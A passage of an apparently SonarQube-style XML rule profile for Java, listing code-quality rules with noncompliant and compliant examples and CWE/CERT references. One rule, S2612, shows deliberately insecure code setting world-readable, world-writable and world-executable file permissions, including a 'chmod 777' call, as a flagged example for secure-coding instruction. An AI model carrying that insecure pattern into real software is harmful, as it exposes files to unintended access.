            Map&amp;lt;String,List&amp;lt;Integer&amp;gt;&amp;gt; map = new HashMap&amp;lt;String,List&amp;lt;Integer&amp;gt;&amp;gt;();
            // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            List&amp;lt;String&amp;gt; strings = new ArrayList&amp;lt;&amp;gt;();
            Map&amp;lt;String,List&amp;lt;Integer&amp;gt;&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S2326' priority='MAJOR'>
        <configKey>S2326</configKey>
        <name>Unused type parameters should be removed</name>
        <description>
            &lt;p&gt;Type parameters that aren't used are dead code, which can only distract and possibly confuse
            developers during maintenance. Therefore, unused type
            parameters should be removed.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int &amp;lt;T&amp;gt; Add(int a, int b) // Noncompliant; &amp;lt;T&amp;gt; is ignored
            {
            return a + b;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            int Add(int a, int b)
            {
            return a + b;
            }
            &lt;/pre&gt;
        </description>
        <tag>cert</tag>
        <tag>unused</tag>
    </rule>

    <rule key='S2386' priority='MINOR'>
        <configKey>S2386</configKey>
        <name>Mutable fields should not be &quot;public static&quot;</name>
        <description>
            &lt;p&gt;There is no good reason to have a mutable object as the &lt;code&gt;public&lt;/code&gt; (by
            default), &lt;code&gt;static&lt;/code&gt; member of an &lt;code&gt;interface&lt;/code&gt;.
            Such variables should be moved into classes and their visibility lowered. &lt;/p&gt;
            &lt;p&gt;Similarly, mutable &lt;code&gt;static&lt;/code&gt; members of classes and enumerations which are
            accessed directly, rather than through getters and setters,
            should be protected to the degree possible. That can be done by reducing visibility or making the field &lt;code&gt;final&lt;/code&gt;
            if appropriate. &lt;/p&gt;
            &lt;p&gt;Note that making a mutable field, such as an array, &lt;code&gt;final&lt;/code&gt; will keep the
            variable from being reassigned, but doing so has no effect on
            the mutability of the internal state of the array (i.e. it doesn't accomplish the goal).&lt;/p&gt;
            &lt;p&gt;This rule raises issues for &lt;code&gt;public static&lt;/code&gt; array, &lt;code&gt;Collection&lt;/code&gt;,
            &lt;code&gt;Date&lt;/code&gt;, and &lt;code&gt;awt.Point&lt;/code&gt; members.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public interface MyInterface {
            public static String [] strings; // Noncompliant
            }

            public class A {
            public static String [] strings1 = {&quot;first&quot;,&quot;second&quot;}; // Noncompliant
            public static String [] strings2 = {&quot;first&quot;,&quot;second&quot;}; // Noncompliant
            public static List&amp;lt;String&amp;gt; strings3 = new ArrayList&amp;lt;&amp;gt;(); // Noncompliant
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/582.html&quot;&gt;MITRE, CWE-582&lt;/a&gt;
            - Array Declared Public, Final, and Static &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/607.html&quot;&gt;MITRE, CWE-607&lt;/a&gt;
            - Public Static Final Field References Mutable Object &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/LjdGBQ&quot;&gt;CERT, OBJ01-J.&lt;/a&gt; -
            Limit accessibility of fields &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/VzZGBQ&quot;&gt;CERT, OBJ13-J.&lt;/a&gt; -
            Ensure that references to mutable objects are not exposed &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>unpredictable</tag>
    </rule>

    <rule key='S2387' priority='BLOCKER'>
        <configKey>S2387</configKey>
        <name>Child class fields should not shadow parent class fields</name>
        <description>
            &lt;p&gt;Having a variable with the same name in two unrelated classes is fine, but do the same thing within
            a class hierarchy and you'll get confusion at
            best, chaos at worst. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Fruit {
            protected Season ripe;
            protected Color flesh;

            // ...
            }

            public class Raspberry extends Fruit {
            private boolean ripe; // Noncompliant
            private static Color FLESH; // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Fruit {
            protected Season ripe;
            protected Color flesh;

            // ...
            }

            public class Raspberry extends Fruit {
            private boolean ripened;
            private static Color FLESH_COLOR;

            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule ignores same-name fields that are &lt;code&gt;static&lt;/code&gt; in both the parent and
            child classes. This rule ignores &lt;code&gt;private&lt;/code&gt; parent
            class fields, but in all other such cases, the child class field should be renamed.&lt;/p&gt;
            &lt;pre&gt;
            public class Fruit {
            private Season ripe;
            // ...
            }

            public class Raspberry extends Fruit {
            private Season ripe; // Compliant as parent field 'ripe' is anyway not visible from Raspberry
            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S2388' priority='MAJOR'>
        <configKey>S2388</configKey>
        <name>Inner class calls to super class methods should be unambiguous</name>
        <description>
            &lt;p&gt;When an inner class extends another class, and both its outer class and its parent class have a
            method with the same name, calls to that method can
            be confusing. The compiler will resolve the call to the superclass method, but maintainers may be confused,
            so the superclass method should be called
            explicitly, using &lt;code&gt;super.&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Parent {
            public void foo() { ... }
            }

            public class Outer {

            public void foo() { ... }

            public class Inner extends Parent {

            public void doTheThing() {
            foo(); // Noncompliant; was Outer.this.foo() intended instead?
            // ...
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Parent {
            public void foo() { ... }
            }

            public class Outer {

            public void foo() { ... }

            public class Inner extends Parent {

            public void doTheThing() {
            super.foo();
            // ...
            }
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S2390' priority='CRITICAL'>
        <configKey>S2390</configKey>
        <name>Classes should not access their own subclasses during initialization</name>
        <description>
            &lt;p&gt;When a parent class references a member of a subclass during its own initialization, the results
            might not be what you expect because the child
            class might not have been initialized yet. This could create what is known as an &quot;initialisation cycle&quot;,
            or even a deadlock in some extreme cases.&lt;/p&gt;
            &lt;p&gt;To make things worse, these issues are very hard to diagnose so it is highly recommended you avoid
            creating this kind of dependencies.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class Parent {
            static int field1 = Child.method(); // Noncompliant
            static int field2 = 42;

            public static void main(String[] args) {
            System.out.println(Parent.field1); // will display &quot;0&quot; instead of &quot;42&quot;
            }
            }

            class Child extends Parent {
            static int method() {
            return Parent.field2;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.securecoding.cert.org/confluence/display/java/DCL00-J.+Prevent+class+initialization+cycles&quot;&gt;CERT,
            DCL00-J.&lt;/a&gt; - Prevent
            class initialization cycles &lt;/li&gt;
            &lt;li&gt; Java Language Specifications - &lt;a href=&quot;https://docs.oracle.com/javase/specs/jls/se8/html/jls-12.html#jls-12.4&quot;&gt;Section
            12.4: Initialization of
            Classes and Interfaces&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S2437' priority='BLOCKER'>
        <configKey>S2437</configKey>
        <name>Silly bit operations should not be performed</name>
        <description>
            &lt;p&gt;Certain bit operations are just silly and should not be performed because their results are
            predictable.&lt;/p&gt;
            &lt;p&gt;Specifically, using &lt;code&gt;&amp;amp; -1&lt;/code&gt; with any value will always result in the
            original value, as will &lt;code&gt;anyValue ^ 0&lt;/code&gt; and
            &lt;code&gt;anyValue | 0&lt;/code&gt;.&lt;/p&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S2438' priority='MAJOR'>
        <configKey>S2438</configKey>
        <name>&quot;Threads&quot; should not be used where &quot;Runnables&quot; are expected</name>
        <description>
            &lt;p&gt;While it is technically correct to use a &lt;code&gt;Thread&lt;/code&gt; where a &lt;code&gt;Runnable&lt;/code&gt;
            is called for, the semantics of the two objects are
            different, and mixing them is a bad practice that will likely lead to headaches in the future.&lt;/p&gt;
            &lt;p&gt;The crux of the issue is that &lt;code&gt;Thread&lt;/code&gt; is a larger concept than &lt;code&gt;Runnable&lt;/code&gt;.
            A &lt;code&gt;Runnable&lt;/code&gt; is an object whose
            running should be managed. A &lt;code&gt;Thread&lt;/code&gt; expects to manage the running of itself or
            other &lt;code&gt;Runnables&lt;/code&gt;. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public static void main(String[] args) {
            Thread r =new Thread() {
            int p;
            @Override
            public void run() {
            while(true)
            System.out.println(&quot;a&quot;);
            }
            };
            new Thread(r).start(); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public static void main(String[] args) {
            Runnable r =new Runnable() {
            int p;
            @Override
            public void run() {
            while(true)
            System.out.println(&quot;a&quot;);
            }
            };
            new Thread(r).start();
            &lt;/pre&gt;
        </description>
        <tag>multi-threading</tag>
        <tag>pitfall</tag>
    </rule>

    <rule key='S2440' priority='MAJOR'>
        <configKey>S2440</configKey>
        <name>Classes with only &quot;static&quot; methods should not be instantiated</name>
        <description>
            &lt;p&gt;&lt;code&gt;static&lt;/code&gt; methods can be accessed without an instance of the enclosing class,
            so there's no reason to instantiate a class that has only
            &lt;code&gt;static&lt;/code&gt; methods.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class TextUtils {
            public static String stripHtml(String source) {
            return source.replaceAll(&quot;&amp;lt;[^&amp;gt;]+&amp;gt;&quot;, &quot;&quot;);
            }
            }

            public class TextManipulator {

            // ...

            public void cleanText(String source) {
            TextUtils textUtils = new TextUtils(); // Noncompliant

            String stripped = textUtils.stripHtml(source);

            //...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class TextUtils {
            public static String stripHtml(String source) {
            return source.replaceAll(&quot;&amp;lt;[^&amp;gt;]+&amp;gt;&quot;, &quot;&quot;);
            }
            }

            public class TextManipulator {

            // ...

            public void cleanText(String source) {
            String stripped = TextUtils.stripHtml(source);

            //...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See Also&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href='/coding_rules#rule_key=java%3AS1118'&gt;S1118&lt;/a&gt; - Utility classes should not
            have public constructors &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S2441' priority='MAJOR'>
        <configKey>S2441</configKey>
        <name>Non-serializable objects should not be stored in &quot;HttpSession&quot; objects</name>
        <description>
            &lt;p&gt;If you have no intention of writting an &lt;code&gt;HttpSession&lt;/code&gt; object to file, then
            storing non-&lt;code&gt;serializable&lt;/code&gt; objects in it may not
            seem like a big deal. But whether or not you explicitly serialize the session, it may be written to disk
            anyway, as the server manages its memory use
            in a process called &quot;passivation&quot;. Further, some servers automatically write their active sessions
            out to file at shutdown &amp;amp; deserialize any such
            sessions at startup.&lt;/p&gt;
            &lt;p&gt;The point is, that even though &lt;code&gt;HttpSession&lt;/code&gt; does not &lt;code&gt;extend
            Serializable&lt;/code&gt;, you must nonetheless assume that it will be
            serialized, and understand that if you've stored non-serializable objects in the session, errors will
            result. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Address {
            //...
            }

            //...
            HttpSession session = request.getSession();
            session.setAttribute(&quot;address&quot;, new Address()); // Noncompliant; Address isn't serializable
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/579.html&quot;&gt;MITRE, CWE-579&lt;/a&gt;
            - J2EE Bad Practices: Non-serializable Object Stored in Session
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
    </rule>

    <rule key='S2442' priority='MAJOR'>
        <configKey>S2442</configKey>
        <name>&quot;Lock&quot; objects should not be &quot;synchronized&quot;</name>
        <description>
            &lt;p&gt;&lt;code&gt;java.util.concurrent.locks.Lock&lt;/code&gt; offers far more powerful and flexible
            locking operations than are available with
            &lt;code&gt;synchronized&lt;/code&gt; blocks. So synchronizing on a &lt;code&gt;Lock&lt;/code&gt; throws
            away the power of the object, and is just silly. Instead, such
            objects should be locked and unlocked using &lt;code&gt;tryLock()&lt;/code&gt; and &lt;code&gt;unlock()&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Lock lock = new MyLockImpl();
            synchronized(lock) { // Noncompliant
            //...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Lock lock = new MyLockImpl();
            lock.tryLock();
            //...
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/qjdGBQ&quot;&gt;CERT, LCK03-J.&lt;/a&gt; -
            Do not synchronize on the intrinsic locks of high-level concurrency
            objects &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>clumsy</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2445' priority='MAJOR'>
        <configKey>S2445</configKey>
        <name>Blocks should be synchronized on &quot;private final&quot; fields</name>
        <description>
            &lt;p&gt;Synchronizing on a class field synchronizes not on the field itself, but on the object assigned to
            it. So synchronizing on a non-&lt;code&gt;final&lt;/code&gt;
            field makes it possible for the field's value to change while a thread is in a block synchronized on the old
            value. That would allow a second thread,
            synchronized on the new value, to enter the block at the same time.&lt;/p&gt;
            &lt;p&gt;The story is very similar for synchronizing on parameters; two different threads running the method
            in parallel could pass two different object
            instances in to the method as parameters, completely undermining the synchronization.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            private String color = &quot;red&quot;;

            private void doSomething(){
            synchronized(color) { // Noncompliant; lock is actually on object instance &quot;red&quot; referred to by
            the color variable
            //...
            color = &quot;green&quot;; // other threads now allowed into this block
            // ...
            }
            synchronized(new Object()) { // Noncompliant this is a no-op.
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            private String color = &quot;red&quot;;
            private final Object lockObj = new Object();

            private void doSomething(){
            synchronized(lockObj) {
            //...
            color = &quot;green&quot;;
            // ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/412.html&quot;&gt;MITRE, CWE-412&lt;/a&gt;
            - Unrestricted Externally Accessible Lock &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/413&quot;&gt;MITRE, CWE-413&lt;/a&gt; -
            Improper Resource Locking &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/djdGBQ&quot;&gt;CERT, LCK00-J.&lt;/a&gt; -
            Use private final lock objects to synchronize classes that may
            interact with untrusted code &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2446' priority='MAJOR'>
        <configKey>S2446</configKey>
        <name>&quot;notifyAll&quot; should be used</name>
        <description>
            &lt;p&gt;&lt;code&gt;notify&lt;/code&gt; and &lt;code&gt;notifyAll&lt;/code&gt; both wake up sleeping
            threads, but &lt;code&gt;notify&lt;/code&gt; only rouses one, while &lt;code&gt;notifyAll&lt;/code&gt;
            rouses all of them. Since &lt;code&gt;notify&lt;/code&gt; might not wake up the right thread, &lt;code&gt;notifyAll&lt;/code&gt;
            should be used instead.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class MyThread extends Thread{

            @Override
            public void run(){
            synchronized(this){
            // ...
            notify(); // Noncompliant
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class MyThread extends Thread{

            @Override
            public void run(){
            synchronized(this){
            // ...
            notifyAll();
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/MTdGBQ&quot;&gt;CERT, THI02-J.&lt;/a&gt; -
            Notify all waiting threads rather than a single thread &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2447' priority='CRITICAL'>
        <configKey>S2447</configKey>
        <name>Null should not be returned from a &quot;Boolean&quot; method</name>
        <description>
            &lt;p&gt;While &lt;code&gt;null&lt;/code&gt; is technically a valid &lt;code&gt;Boolean&lt;/code&gt; value,
            that fact, and the distinction between &lt;code&gt;Boolean&lt;/code&gt; and
            &lt;code&gt;boolean&lt;/code&gt; is easy to forget. So returning &lt;code&gt;null&lt;/code&gt; from a &lt;code&gt;Boolean&lt;/code&gt;
            method is likely to cause problems with callers'
            code.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public Boolean isUsable() {
            // ...
            return null; // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/476.html&quot;&gt;MITRE CWE-476&lt;/a&gt;
            - NULL Pointer Dereference &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/aDdGBQ&quot;&gt;CERT, EXP01-J.&lt;/a&gt; -
            Do not use a null in a case where an object is required &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>pitfall</tag>
        <securityStandards>
            <cwe>476</cwe>
        </securityStandards>
    </rule>

    <rule key='S2479' priority='CRITICAL'>
        <configKey>S2479</configKey>
        <name>Whitespace and control characters in literals should be explicit</name>
        <description>
            &lt;p&gt;Non-encoded control characters and whitespace characters are often injected in the source code
            because of a bad manipulation. They are either
            invisible or difficult to recognize, which can result in bugs when the string is not what the developer
            expects. If you actually need to use a control
            character use their encoded version (ex: ASCII &lt;code&gt;\n,\t,&lt;/code&gt;... or Unicode &lt;code&gt;U+000D,
            U+0009,&lt;/code&gt;...).&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the following characters are seen in a literal string:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/ASCII#Control_characters&quot;&gt;ASCII control
            character&lt;/a&gt;. (character index &amp;lt; 32 or = 127) &lt;/li&gt;
            &lt;li&gt; Unicode &lt;a href=&quot;https://en.wikipedia.org/wiki/Unicode_character_property#Whitespace&quot;&gt;whitespace
            characters&lt;/a&gt;. &lt;/li&gt;
            &lt;li&gt; Unicode &lt;a href=&quot;https://en.wikipedia.org/wiki/C0_and_C1_control_codes&quot;&gt;C0
            control characters&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; Unicode characters &lt;code&gt;U+200B, U+200C, U+200D, U+2060, U+FEFF, U+2028, U+2029&lt;/code&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;No issue will be raised on the simple space character. Unicode &lt;code&gt;U+0020&lt;/code&gt;,
            ASCII 32.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String tabInside = &quot;A B&quot;; // Noncompliant, contains a tabulation
            String zeroWidthSpaceInside = &quot;foo​bar&quot;; // Noncompliant, it contains a U+200B character inside
            char tab = ' ';
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String tabInside = &quot;A\tB&quot;; // Compliant, uses escaped value
            String zeroWidthSpaceInside = &quot;foo\u200Bbar&quot;; // Compliant, uses escaped value
            char tab = '\t';
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Text Blocks string literals (java 13 three double-quote marks) can contain tabulations to allow
            indentation using tabulations.&lt;/p&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S2583' priority='MAJOR'>
        <configKey>S2583</configKey>
        <name>Conditionally executed code should be reachable</name>
        <description>
            &lt;p&gt;Conditional expressions which are always &lt;code&gt;true&lt;/code&gt; or &lt;code&gt;false&lt;/code&gt;
            can lead to dead code. Such code is always buggy and should never
            be used in production.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            a = false;
            if (a) { // Noncompliant
            doSomething(); // never executed
            }

            if (!a || b) { // Noncompliant; &quot;!a&quot; is always &quot;true&quot;, &quot;b&quot; is never evaluated
            doSomething();
            } else {
            doSomethingElse(); // never executed
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule will not raise an issue in either of these cases:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; When the condition is a single &lt;code&gt;final boolean&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            final boolean debug = false;
            //...
            if (debug) {
            // Print something
            }
            &lt;/pre&gt;
            &lt;ul&gt;
            &lt;li&gt; When the condition is literally &lt;code&gt;true&lt;/code&gt; or &lt;code&gt;false&lt;/code&gt;.
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            if (true) {
            // do something
            }
            &lt;/pre&gt;
            &lt;p&gt;In these cases it is obvious the code is as intended.&lt;/p&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/570.html&quot;&gt;MITRE, CWE-570&lt;/a&gt;
            - Expression is Always False &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/571&quot;&gt;MITRE, CWE-571&lt;/a&gt; -
            Expression is Always True &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/5dUxBQ&quot;&gt;CERT, MSC12-C.&lt;/a&gt; -
            Detect and remove code that has no effect or is never executed
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>pitfall</tag>
        <tag>suspicious</tag>
        <tag>unused</tag>
        <securityStandards>
            <cwe>489,571,570</cwe>
        </securityStandards>
    </rule>

    <rule key='S2589' priority='MAJOR'>
        <configKey>S2589</configKey>
        <name>Boolean expressions should not be gratuitous</name>
        <description>
            &lt;p&gt;If a boolean expression doesn't change the evaluation of the condition, then it is entirely
            unnecessary, and can be removed. If it is gratuitous
            because it does not match the programmer's intent, then it's a bug and the expression should be fixed.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            a = true;
            if (a) { // Noncompliant
            doSomething();
            }

            if (b &amp;amp;&amp;amp; a) { // Noncompliant; &quot;a&quot; is always &quot;true&quot;
            doSomething();
            }

            if (c || !a) { // Noncompliant; &quot;!a&quot; is always &quot;false&quot;
            doSomething();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            a = true;
            if (foo(a)) {
            doSomething();
            }

            if (b) {
            doSomething();
            }

            if (c) {
            doSomething();
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/571&quot;&gt;MITRE, CWE-571&lt;/a&gt; -
            Expression is Always True &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/570&quot;&gt;MITRE, CWE-570&lt;/a&gt; -
            Expression is Always False &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>redundant</tag>
        <tag>suspicious</tag>
        <securityStandards>
            <cwe>489,571,570</cwe>
        </securityStandards>
    </rule>

    <rule key='S2612' priority='MAJOR'>
        <configKey>S2612</configKey>
        <name>Setting loose POSIX file permissions is security-sensitive</name>
        <description>
            &lt;p&gt;In Unix, &quot;&lt;code&gt;others&lt;/code&gt;&quot; class refers to all users except the owner of
            the file and the members of the group assigned to this file.&lt;/p&gt;
            &lt;p&gt;Granting permissions to this group can lead to unintended access to files. &lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; The application is designed to be run on a multi-user environment. &lt;/li&gt;
            &lt;li&gt; Corresponding files and directories may contain confidential information. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;The most restrictive possible permissions should be assigned to files and directories.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void setPermissions(String filePath) {
            Set&amp;lt;PosixFilePermission&amp;gt; perms = new HashSet&amp;lt;PosixFilePermission&amp;gt;();
            // user permission
            perms.add(PosixFilePermission.OWNER_READ);
            perms.add(PosixFilePermission.OWNER_WRITE);
            perms.add(PosixFilePermission.OWNER_EXECUTE);
            // group permissions
            perms.add(PosixFilePermission.GROUP_READ);
            perms.add(PosixFilePermission.GROUP_EXECUTE);
            // others permissions
            perms.add(PosixFilePermission.OTHERS_READ); // Sensitive
            perms.add(PosixFilePermission.OTHERS_WRITE); // Sensitive
            perms.add(PosixFilePermission.OTHERS_EXECUTE); // Sensitive

            Files.setPosixFilePermissions(Paths.get(filePath), perms);
            }
            &lt;/pre&gt;
            &lt;pre&gt;
            public void setPermissionsUsingRuntimeExec(String filePath) {
            Runtime.getRuntime().exec(&quot;chmod 777 file.json&quot;); // Sensitive
            }
            &lt;/pre&gt;
            &lt;pre&gt;
            public void setOthersPermissionsHardCoded(String filePath ) {
            Files.setPosixFilePermissions(Paths.get(filePath), PosixFilePermissions.fromString(&quot;rwxrwxrwx&quot;));
            // Sensitive
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;On operating systems that implement POSIX standard. This will throw a &lt;code&gt;UnsupportedOperationException&lt;/code&gt;
            on Windows.&lt;/p&gt;
            &lt;pre&gt;
            public void setPermissionsSafe(String filePath) throws IOException {
            Set&amp;lt;PosixFilePermission&amp;gt; perms = new HashSet&amp;lt;PosixFilePermission&amp;gt;();
            // user permission
            perms.add(PosixFilePermission.OWNER_READ);
            perms.add(PosixFilePermission.OWNER_WRITE);
            perms.add(PosixFilePermission.OWNER_EXECUTE);
            // group permissions
            perms.add(PosixFilePermission.GROUP_READ);
            perms.add(PosixFilePermission.GROUP_EXECUTE);
            // others permissions removed
            perms.remove(PosixFilePermission.OTHERS_READ); // Compliant
            perms.remove(PosixFilePermission.OTHERS_WRITE); // Compliant
            perms.remove(PosixFilePermission.OTHERS_EXECUTE); // Compliant

            Files.setPosixFilePermissions(Paths.get(filePath), perms);
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control&quot;&gt;OWASP
            Top 10 2017 Category A5&lt;/a&gt; - Broken Access Control &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Test_File_Permission_(OTG-CONFIG-009)&quot;&gt;OWASP
            File Permission&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/732&quot;&gt;MITRE, CWE-732&lt;/a&gt; -
            Incorrect Permission Assignment for Critical Resource &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/266.html&quot;&gt;MITRE, CWE-266&lt;/a&gt;
            - Incorrect Privilege Assignment &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/display/java/FIO01-J.+Create+files+with+appropriate+access+permissions&quot;&gt;CERT,
            FIO01-J.&lt;/a&gt; -
            Create files with appropriate access permissions &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions&quot;&gt;CERT,
            FIO06-C.&lt;/a&gt; - Create
            files with appropriate access permissions &lt;/li&gt;
